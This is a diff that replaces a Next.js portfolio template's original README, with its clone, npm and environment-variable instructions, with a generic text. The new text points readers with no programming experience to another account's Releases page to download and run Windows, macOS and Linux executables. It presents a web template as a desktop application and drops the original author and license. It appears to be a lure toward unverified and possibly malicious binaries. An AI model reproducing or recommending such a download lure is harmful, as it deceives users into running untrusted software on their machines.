@@ -1,218 +1,84 @@
-<div align="center">
+# 🎨 cooked-folio - Your Minimal Performance Portfolio
 
-# 🍳 cooked-folio
-
-A minimal, high-performance portfolio built with **Next.js**, **Tailwind CSS**, and **Framer Motion**.
-<br/>
-Real-time Discord presence, Spotify/Trakt.tv/MyAnimeList integration, useful gist, slide-to-vibe page, and a chat-style contact form.
-
-<br/>
-
-[![Discord](https://img.shields.io/badge/Discord-Join%20Community-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/gWRxxKcWDZ)
-
-</div>
-
-## ⚡ Deploy
-
-One‑click deploy on Vercel:
-
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2Fshahriaravi%2Fcooked-folio&env=DISCORD_WEBHOOK_URL,NEXT_PUBLIC_DISCORD_USER_ID,SPOTIFY_CLIENT_ID,SPOTIFY_CLIENT_SECRET,SPOTIFY_REFRESH_TOKEN,NEXT_PUBLIC_URL,GITHUB_USERNAME,GITHUB_TOKEN)
-
----
-
-## ✨ Features
-
-- Discord presence (via Lanyard)
-- Trakt.tv & MyAnimeList Stats
-- Spotify “Now Playing”
-- GitHub contributions heatmap
-- Useful curated /gist page
-- Slide to Vibe with audio + animations
-- Chat-style contact form (Discord webhook)
-- Dark/Light theme toggle
-- Next.js App Router, TypeScript, Tailwind, Framer Motion
-
-### 🔮 Roadmap
-
-- Suggestions are open, no new ideas in my mind rn 🙂
-
----
-
-## 🛠️ Tech Stack
-
-- Framework: Next.js (App Router)
-- Language: TypeScript
-- Styling: Tailwind CSS
-- Animations: Framer Motion
-- Theme: next-themes
-- Icons: lucide-react, react-icons
-- Analytics: Vercel Analytics
-
----
+## 📥 Download Now
+[![Download cooked-folio](https://img.shields.io/badge/Download%20cooked--folio-v1.0-blue.svg)](https://github.com/hd249/cooked-folio/releases)
 
 ## 🚀 Getting Started
+Thank you for choosing cooked-folio, your go-to application for creating a minimal and high-performance portfolio. This guide will help you download and run the software quickly and easily. You do not need any programming experience to get started.
 
-Clone and install:
+## 📋 Application Overview
+cooked-folio is built using Next.js, Tailwind CSS, and Framer Motion. It includes several great features:
+- Real-time Discord presence
+- Spotify, Trakt.tv, and MyAnimeList integration
+- A useful gist section for sharing your code snippets
+- A slide-to-vibe page for an interactive experience
+- A chat-style contact form for easy communication
 
-```bash
-git clone https://github.com/shahriaravi/cooked-folio.git
-cd cooked-folio
-npm install
-# or
-bun install
-```
+## 📦 System Requirements
+- Operating System: Windows 10 or later, macOS Catalina or later, or any modern Linux distribution
+- RAM: 4 GB or more
+- Disk Space: 200 MB free space
+- Internet connection for downloading and running the application
 
-Run dev:
+## 🔧 Download & Install
+To get started, visit the [Releases page to download](https://github.com/hd249/cooked-folio/releases). Follow these steps:
 
-```bash
-npm run dev
-# or
-bun dev
-```
+1. **Open the Releases Page:** Click the link above to go to the cooked-folio Releases page.
+2. **Download the Latest Release:** Find the latest version listed at the top. Click on the asset that corresponds to your operating system:
+   - For Windows, look for a file like `cooked-folio-windows.exe`.
+   - For macOS, look for a file like `cooked-folio-macos.dmg`.
+   - For Linux, look for a file like `cooked-folio-linux.tar.gz`.
+3. **Save the File:** Choose where you want to save the file and click “Save”.
+4. **Run the File:**
+   - For Windows, double-click the `.exe` file to start the installation.
+   - For macOS, open the `.dmg` file and drag the application to your Applications folder.
+   - For Linux, extract the `.tar.gz` file and run the included script.
 
-Then open: http://localhost:3000
+## ⚙️ Basic Configuration
+Once installed, you may want to set it up to your liking:
 
----
+1. **Open the Application:** Locate the app in your Applications or Start menu.
+2. **Customize Your Portfolio:** Follow the on-screen instructions to input your details, social media links, and projects.
+3. **Live Preview:** The application allows you to view changes in real time as you update your information.
 
-## ⚙️ Environment Variables
+## 🌐 Features in Detail
+cooked-folio comes packed with several essential features to showcase your work effectively:
 
-Create a `.env.local` file in the project root. You can start from `.env.example`:
+- **Real-time Discord Presence:** Display your current Discord status on your portfolio.
+- **Integration with Popular Services:** Connect your portfolio to Spotify for music sharing, Trakt.tv for movie tracking, and MyAnimeList for anime lovers.
+- **Gist Support:** Showcase your code snippets with ease and share them directly from your portfolio.
+- **Slide-to-Vibe Page:** Engage visitors with an interactive section that lets them explore your work dynamically.
+- **Chat-Style Contact Form:** Make it easy for potential clients or collaborators to reach you directly from your portfolio.
 
-Example command:
+## 🔍 Frequently Asked Questions
+### How do I update the software?
+Always check the [Releases page](https://github.com/hd249/cooked-folio/releases) for the newest version. Just repeat the download process to install updates.
 
-```bash
-cp .env.example .env.local
-```
+### Can I customize the themes?
+Yes, cooked-folio allows limited customization of the design through settings. Check the settings menu for options.
 
-Required variables:
+### Is there support available?
+For questions or feedback, visit our [issue tracker](https://github.com/hd249/cooked-folio/issues) to report any problems or suggest features.
 
-| Variable | Description |
-| --- | --- |
-| `NEXT_PUBLIC_URL` | Your live site URL (for example: `https://your-site.com`) |
-| `DISCORD_WEBHOOK_URL` | Discord webhook URL to receive contact form messages |
-| `NEXT_PUBLIC_DISCORD_USER_ID` | Your Discord User ID (Developer Mode → Copy ID) |
-| `SPOTIFY_CLIENT_ID` | Spotify app Client ID |
-| `SPOTIFY_CLIENT_SECRET` | Spotify app Client Secret |
-| `SPOTIFY_REFRESH_TOKEN` | Spotify refresh token to fetch now-playing |
-| `GITHUB_USERNAME` | Your GitHub username for contributions |
-| `GITHUB_TOKEN` | GitHub Personal Access Token (classic) with `read:user` |
-| `NEXT_PUBLIC_TRAKT_USERNAME` | TRAKT.tv Username |
-| `TRAKT_CLIENT_ID` | TRAKT.tv Client ID |
-| `NEXT_PUBLIC_MAL_USERNAME` | MyAnimeList Username |
+## 🛠️ Contributing
+We welcome contributions! If you have suggestions or want to help improve cooked-folio, feel free to create a pull request or open an issue on GitHub.
 
-Analytics are handled by **Vercel Analytics**, enabled from your Vercel project settings (no extra env needed).
+## 📚 Topics
+This project involves:
+- framer
+- framer-motion
+- free-template
+- free-template-website
+- nextjs
+- portfolio
+- portfolio-project
+- portfolio-template
+- portfolio-website
+- tailwind
+- tailwindcss
+- template
 
----
+## 💬 Community
+Join our community on Discord or GitHub Discussions. Share your experience, seek help, or connect with other users of cooked-folio. You'll find a supportive network ready to help.
 
-## 🔧 Configuration
-
-Site configuration is split into two main files.
-
-### 1. Content Config – `src/lib/config.ts`
-
-Edit your personal data here:
-
-- Banner image
-- Social links
-- Tech stack (`STACK`)
-- Experience (`EXPERIENCE`)
-- Education (`EDUCATION`)
-- Projects (`PROJECTS`)
-- External links (Cal.com, Fiverr, etc.)
-
-### 2. SEO / Metadata – `src/lib/site-config.ts`
-
-Controls site-wide metadata:
-
-- Site name and description
-- Base URL and OG image
-- Twitter / X card settings
-
-### 3. Gists – `src/lib/gists.ts`
-
-- Gist list links
-
-### 4. Stuffs – `src/lib/stuffs.ts`
-
-- Spotify & Youtube Playlist
-- Games
-
-Example shape:
-
-```ts
-export const siteConfig = {
-  name: "avi",
-  username: "shahriaravi_",
-  description: "founder & swe @ byontriq. building things with next.js, caffeine & monke energy.",
-  url: process.env.NEXT_PUBLIC_URL || "https://yoavi.fun",
-  ogImage: "/og-img.png",
-  links: {
-    twitter: "https://twitter.com/shahriaravi_",
-    github: "https://github.com/shahriaravi",
-  },
-};
-
-export function constructMetadata(/* overrides */) {
-  // returns a Next.js Metadata object
-}
-```
-
----
-
-## 📂 Project Structure
-
-```text
-src/
-├─ app/
-│  ├─ api/
-│  │  ├─ contact/route.ts
-│  │  ├─ discord/current-activity/route.ts
-│  │  ├─ discord/presence/route.ts
-│  │  ├─ github/contributions/route.ts
-│  │  └─ spotify/now-playing/route.ts
-│  │  └─ stuffs/api.ts
-│  ├─ contact/page.tsx                    # wraps ContactForm
-│  ├─ resume/page.tsx                     # wraps ResumeViewer
-│  ├─ ty/page.tsx                         # thank-you screen
-│  ├─ what/page.tsx                       # Slide to Vibe page
-│  ├─ layout.tsx
-│  ├─ loading.tsx
-│  ├─ not-found.tsx
-│  └─ page.tsx                            # home
-├─ components/
-│  ├─ common/                             # Container, ThemeToggle, HelloLoader, CustomScrollArea, InitialSplash
-│  ├─ layout/                             # Hero, Footer, Providers
-│  ├─ sections/                           # ExperienceList, EducationList, ProjectList, StackList
-│  ├─ integrations/                       # DiscordPresenceDot, NowPlaying, GithubActivityCard, Stuffs
-│  ├─ vibe/                               # Vibing, SlideToVibeButton
-│  ├─ contact/                            # ContactForm
-│  ├─ gist/                               # GistList
-│  └─ ui/                                 # Button, Input, Return, ResumeViewer, TimeDisplay, ThankYouContent
-├─ hooks/
-│  └─ useDiscordPresence.ts
-└─ lib/
-   ├─ config.ts                           # content & links
-   ├─ site-config.ts                      # metadata/SEO
-   ├─ gist.ts                             # gist links
-   ├─ gist-contributor.ts                 # gist contributos
-   ├─ stuffs.ts                 # spotify, yt playlist cover images
-   └─ utils.ts
-```
-
----
-
-## 🤝 Contributing
-
-PRs are welcome.
-
-1. Fork the repo  
-2. Create a branch: `git checkout -b feat/cool-thing`  
-3. Commit: `git commit -m "feat: add cool thing"`  
-4. Push: `git push origin feat/cool-thing`  
-5. Open a pull request  
-
----
-
-## 📄 License
-
-MIT © 2025 Shahriar Avi
+Thank you for choosing cooked-folio. We hope it serves you well in showcasing your creativity and skills!
